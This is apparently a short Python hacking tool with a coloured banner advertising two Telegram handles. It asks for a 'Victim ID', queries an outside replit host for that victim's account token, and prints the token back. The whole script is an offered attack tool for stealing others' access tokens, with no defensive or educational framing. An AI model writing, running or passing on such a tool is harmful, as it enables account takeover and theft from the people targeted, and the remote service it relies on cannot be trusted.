import requests,os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
print(f'''{B}{E}=============================={B}
|{G}[+] Telegram : {B}P_P_PX      |
|{G}[+] TeleGram  : {B}@IIWWH     |
{E}==============================''')
uid=input(f"{G}[+] Victim ID ==> {S}")
print(f'{E}==============================')
res=requests.get(f'https://token.saraboot5880.repl.co/uid={uid}').json()
if res['Status'] == 'Success':
 token=res['Token']
 print(f'{G}[√] Token : {B}{token}')
else:
 print(f'{E}[×] ID Error')
